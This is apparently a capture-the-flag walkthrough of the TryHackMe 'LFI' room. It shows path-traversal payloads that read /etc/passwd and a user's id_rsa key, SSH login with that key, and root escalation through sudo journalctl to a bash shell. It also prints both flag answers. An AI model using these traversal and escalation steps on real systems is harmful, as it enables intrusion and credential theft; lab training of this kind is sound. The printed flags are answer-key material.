# LFI

{% embed url="https://tryhackme.com/room/lfi" %}
https://tryhackme.com/room/lfi
{% endembed %}

## Task 2 Getting user access via LFI

#### Look around the website. What is the name of the parameter you found on the website?

![](<../../.gitbook/assets/Screenshot from 2022-03-30 06-31-42.png>)

{% hint style="success" %}
`page`
{% endhint %}

#### Once we find the vulnerable parameter we can try to include the passwd file on the Linux system i.e /etc/passwd. The most common technique is path traversal method meaning we can include files like **../../../../etc/passwd** what this does it get out of a directory like we usually do in Linux system by running **cd ../**

#### **../../etc/passwd** means to go out twice from the current working directory and then go to **/etc** directory and read the **passwd** file. Now the issue with this method is you need to be sure about the path of the file.

#### Once you include **/etc/passwd** then you should see entries something like:

![](<../../.gitbook/assets/Screenshot from 2022-03-30 06-35-33.png>)

#### This file can give information about the system like the name of all the existing users on the system. **** What is the name of the user on the system?

![](<../../.gitbook/assets/Screenshot from 2022-03-30 06-36-48.png>)

{% hint style="success" %}
`falcon`
{% endhint %}

#### Once you find the name of the user it's important to see if you can include anything **common** and **important** in that user's directory, could be anything like theirs **.bashrc** etc

#### Name of the file which can give you access to falcon's account on the system?

![](<../../.gitbook/assets/Screenshot from 2022-03-30 06-39-55.png>)

{% hint style="success" %}
`id_rsa`
{% endhint %}

#### What is the user flag?

```bash
vim id_rsa
chmod 4000 id_rsa
ssh -i id_rsa falcon@10.10.7.221
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-30 06-41-22.png>)

{% hint style="success" %}
`B8LEGIF049JT4RTVWUG4`
{% endhint %}

## Task 3 Escalating your privileges to root

#### What can falcon run as **root**?

```bash
sudo -l
```

![](<../../.gitbook/assets/Screenshot from 2022-03-30 06-47-49.png>)

{% hint style="success" %}
`/bin/journalctl`
{% endhint %}

#### Search gtfobins via the [website](http://gtfobins.github.io/) or by using [gtfo tool](http://github.com/mzfr/gtfo), to see if you find any way to use that binary for privilege escalation. What is the root flag?

```bash
sudo /bin/journalctl
!/bin/bash
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-30 06-49-02.png>)

{% hint style="success" %}
`H1EQRK5XEX140H2KMO08`
{% endhint %}

## **Reference**

{% embed url="https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks" %}
